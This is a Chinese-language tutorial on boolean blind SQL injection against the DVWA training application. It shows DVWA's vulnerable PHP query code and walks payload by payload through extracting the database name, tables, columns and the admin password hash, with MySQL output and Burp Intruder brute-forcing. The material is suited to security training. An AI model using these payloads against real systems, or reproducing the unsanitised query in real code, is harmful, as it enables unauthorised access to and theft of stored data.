## 0x00 什么是盲注？
一般情况下，网页可能不会返回任何数据库内容，所以不能使用联合查询将敏感数据显示在页面，但还是可以通过构造SQL语句来获取数据。

## 0x01 boolean布尔型盲注
从代码中我们可以看到，对于存在于数据库中的id，会返回：User ID exists in the database。 对于不存在于数据库中的id，会返回：User ID is MISSING from the database。 我们并不能直接从网页的回显位置来获取数据库数据，只能知道是否存在，对于获取信息有限的情况下，盲注是很好的注入手段。  
盲注的方式有2种：1.布尔型盲注；2.延时注入；这里我记录了布尔型boolean盲注注入方法。
```php
<?php
if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
## 0x02 判断是否存在注入点的方法
在判断注入点时，先确定是整型注入还是字符型注入，确定如何闭合SQL表达式，然后利用简单payload测试。
```sql
'1' and '1'='1'
'1' and '1'='2'
'1' and sleep(5) --+
```
测试是否存在注入点的paylaod解释：如果存在注入，第一个和第二个返回结果不一样，第一个是正常返回查询结果，第二个返回与正确逻辑相反的结果。sleep是SQL中的内置函数，sleep(10)即为系统睡眠10秒在做出反应。  
通过以上两个检测方法，可以判断该接口是否存在注入漏洞。
## 0x03 布尔注入攻击
为何会有布尔注入攻击这种技术？作用是什么？  
当网页不返回任何数据库内容的时候，就不能通过联合查询注入获取数据库敏感信息，就需要用正确或错误的逻辑来构造SQL语句，进行进一步信息判断。
```bash
mysql> select if(2>1,true,false);
+--------------------+
| if(2>1,true,false) |
+--------------------+
|                  1 |
+--------------------+

mysql> select if(2<1,4,5);
+-------------+
| if(2<1,4,5) |
+-------------+
|           5 |
+-------------+
```
布尔型盲注需要用到SQL语句中if的判断逻辑，表达式：if（（表达式1），1，0）；如果表达式1成立，则返回1，否则返回0。  
同理也可以用if语句来判断是否存在注入点：
```sql
'1' and if(2<1,1,0) --+
```  
页面返回错误，这个语句等价于 1 and 0，真 and 假，结果为假，整个SQL语句id值也是0，所以没有记录，返回错误页面。  
这个语句的查询逻辑是，where后包含了2个条件用and连接起来，只有当前后条件都为真时，才会返回内容，后者如果为假，则where会判断后者逻辑为假，导致查询到的结果为空。
```sql
select * from users where user_id='1' and if(2<1,1,0); #empty

select * from users where user_id='1' and if(2>1,1,0); #admin用户数据被查询显示出来
select * from users where (user_id='1' and if(2>1,1,0)); #admin用户数据被查询显示
```
## 0x04 布尔型盲注获取数据库敏感信息
在黑盒的环境下，通过构造SQL注入语句，根据页面返回特征来获取敏感数据。  
布尔盲注需要用到的第二个函数就是字符串截取函数substring(x,y,z)，其中第1个参数x表示要被截取的字符串，第2个参数y表示开始截取的位置，第3个参数z表示截取的长度。
```bash
mysql> select substring(database(),1,1);
+---------------------------+
| substring(database(),1,1) |
+---------------------------+
| d                         |
+---------------------------+

mysql> select if(substring(database(),1,1)='d',1,0);
+---------------------------------------+
| if(substring(database(),1,1)='d',1,0) |
+---------------------------------------+
|                                     1 |
+---------------------------------------+
```
按照上述思路，可以测试26个英文字母的大小写和数据库名允许的特殊字符，来把数据库名称的每个字符测出来。上面的逻辑是判断数据库名的第一个字符是不是小写字母d，如果是的话返回1，不是返回0。  
接着判断第二个字符，将substring函数的第二个参数改成2，因为要截取第二个字符，第二个字符为v。

```bash
mysql> select if(substring(database(),2,1)='v',1,0);
+---------------------------------------+
| if(substring(database(),2,1)='v',1,0) |
+---------------------------------------+
|                                     1 |
+---------------------------------------+
```
以此类推，再往后依次判断正确数据库名称的字符后拼接，即可获取完整的数据库名。
## 0x05 在黑盒模式下进行布尔注入
黑盒模式下进行布尔盲注的一般流程是：
1. 找到并判断注入点；
2. 获取数据库的长度；
3. 根据长度查询库名；
4. 通过库名再查询表名；
5. 通过表名查询字段；
6. 最后查询某个表中指定的敏感数据；  

我们通过上述步骤已经找到了注入点，现在进行第二步————判断数据库长度。有以下三种方法，可以利用大于或小于判断数据库长度范围，然后利用等号进行数据库名称长度确定。
```sql
select if(length(database())=4,1,0);

select if(length(database())>3,1,0);

select if(length(database())<5,1,0);
```
得到库名长度为4，下面开始获取数据库名称，每次都要与下面这些字符进行比较：  
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_  
```sql
select if(substring(database(),1,1)='a-zA-Z==',1,0);
```
可以获得数据库名的第一个字符是d，然后利用这个方法得到数据库名为dvwa。  
这里可以写脚本批量测试，也可以用burp的Cluster bomb模块测试。  
放在intruder爆破模块中，把第一个变量设置为substring的第二个参数，就是一点一点往后走，从1到4，第二个参数即为等号后面的字符，挨个判断是不是当前字符，返回码为200的表示请求成功，即为数据库名称的第n个位置是字符x。

## 0x06 盲注结合burp获取数据库信息
根据数据库名：dvwa，接下来获取表名。  
获取表名的payload：
```sql
select * from users where user_id='1' and if (substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),1,1)='g',1,0);
```
根据查询页面是否能够正常返回，判断dvwa数据库的每个数据表的名称，一位字符一位字符的进行判断，依次类推，把每个表名获取到。
```sql
mysql> select * from users where user_id='1' and if (substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='g',1,0);
+---------+------------+-----------+-------+----------------------------------+
| user_id | first_name | last_name | user  | password                         |
+---------+------------+-----------+-------+----------------------------------+
|       1 | admin      | admin     | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+------------+-----------+-------+----------------------------------+
1 row in set (0.00 sec)

mysql> select * from users where user_id='1' and if (substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='u',1,0);
Empty set (0.00 sec)

mysql> select * from users where user_id='1' and if (substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1),1,1)='u',1,0);
+---------+------------+-----------+-------+----------------------------------+
| user_id | first_name | last_name | user  | password                         |
+---------+------------+-----------+-------+----------------------------------+
|       1 | admin      | admin     | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+------------+-----------+-------+----------------------------------+
```  
得到表名之后再获取字段名，此时需要利用 information_schema 这个数据库 中的COLUMNS 表。修改payload如下：
```sql
select * from users where user_id='1' and if (substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='dvwa' and TABLE_NAME='users' limit 0,1),1,1)='a',1,0);
# Empty set (0.00 sec)

select * from users where user_id='1' and if (substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='dvwa' and TABLE_NAME='users' limit 0,1),1,1)='u',1,0);
# 正常显示查询内容
```
知道表中字段后，可能就知道了哪些字段中存储了敏感信息，比如username和password等，接下来获取表中敏感信息（例如用户名和密码）。我们首先要知道用户名和密码的长度，然后才能每一位的去获取。

```sql
# 判断长度为38
select * from users where user_id='1' and if ((select length(concat(user,0x3a,password)) from users limit 0,1)=38,1,0);

# 判断第一个字符为a
select * from users where user_id='1' and if (substring((select concat(user,0x3a,password) from users limit 0,1),1,1)='a',1,0);
```  
依次类推，得到admin的账号和密码：admin:5f4dcc3b5aa765d61d8327deb882cf99。